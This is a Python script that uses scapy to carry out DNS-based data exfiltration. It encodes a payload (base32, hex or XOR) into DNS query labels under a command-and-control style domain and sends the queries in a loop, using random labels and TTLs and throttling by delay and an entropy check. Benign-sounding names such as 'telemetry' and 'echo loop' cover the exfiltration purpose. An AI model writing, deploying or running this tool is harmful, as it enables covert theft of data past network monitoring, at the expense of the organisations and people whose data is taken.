import logging
import time
import random
import string
import base64
import json
from datetime import datetime
from scapy.all import IP, UDP, DNS, DNSQR, send

logger = logging.getLogger("DNS_ECHO")
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')


# === Utility: Random Labels and Payload Encoding ===

def _gen_random_label(length=6) -> str:
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def _encode_payload(payload: str, encoding: str = "base32") -> str:
    data = payload.encode()
    if encoding == "base32":
        return base64.b32encode(data).decode().rstrip('=')
    elif encoding == "hex":
        return data.hex()
    elif encoding == "xor":
        xor_key = 0x41
        return ''.join(f"{chr(b ^ xor_key)}" for b in data).encode().hex()
    else:
        raise ValueError(f"Unsupported encoding scheme: {encoding}")


def _craft_dns_query(target_ip: str, qname: str, ttl: int) -> IP:
    return IP(dst=target_ip, ttl=ttl) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=qname))


def _log_packet_telemetry(qname: str, ttl: int, target_ip: str, telemetry_log: str = None):
    if not telemetry_log:
        return

    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "qname": qname,
        "ttl": ttl,
        "target": target_ip
    }

    try:
        with open(telemetry_log, "a") as f:
            f.write(json.dumps(entry) + "\n")
    except Exception as e:
        logger.warning(f"[Telemetry] Failed to write log: {e}")


# === Main DNS Exfiltration Routine ===

def deploy_dns_feedback_loop(
    target_ip: str = "8.8.8.8",
    iterations: int = 10,
    delay: float = 1.0,
    encoding: str = "base32",
    payload: str = None,
    domain: str = "telemetry.operator.net",
    simulation: bool = False,
    entropy_gate: callable = None,
    telemetry_log: str = None
):
    """
    Perform DNS-based echo or exfil operations over crafted queries.

    Args:
        target_ip: Destination DNS server or gateway.
        iterations: Total packets to emit.
        delay: Time (s) between each DNS emission.
        encoding: Encoding for the payload (base32, hex, xor).
        payload: Optional embedded data (string) to encode in query.
        domain: Base domain suffix to simulate operator C2 (e.g., telemetry.op.net).
        simulation: If True, log instead of send packets.
        entropy_gate: Optional callable returning a float. Used to throttle based on entropy.
        telemetry_log: Path to write a JSONL log of emitted queries.
    """
    logger.info(f"[DNS Echo] Initialized — {iterations} rounds, domain={domain}, sim={simulation}")

    encoded_data = None
    if payload:
        try:
            encoded_data = _encode_payload(payload, encoding)
        except Exception as e:
            logger.error(f"[Encoding] Payload encoding failed: {e}")
            return

    for i in range(iterations):
        if entropy_gate and entropy_gate() < 4.5:
            logger.debug(f"[Entropy] Skipping iteration {i}: entropy below threshold.")
            time.sleep(delay)
            continue

        label_1 = _gen_random_label(4)
        label_2 = _gen_random_label(5)

        if encoded_data:
            qname = f"{label_1}.{encoded_data}.{label_2}.{domain}"
        else:
            qname = f"{label_1}.{label_2}.{domain}"

        ttl = random.randint(64, 255)
        packet = _craft_dns_query(target_ip, qname, ttl)

        if simulation:
            logger.info(f"[SIM] Would send DNS Query: {qname} (TTL={ttl})")
        else:
            try:
                send(packet, verbose=False)
                logger.info(f"[SEND] DNS Query: {qname} (TTL={ttl})")
            except Exception as e:
                logger.warning(f"[SEND] Failed to send DNS packet: {e}")

        _log_packet_telemetry(qname, ttl, target_ip, telemetry_log)
        time.sleep(delay)

    logger.info("[DNS Echo] Loop complete.")


# === Compatibility Export ===

dns_echo_loop = deploy_dns_feedback_loop
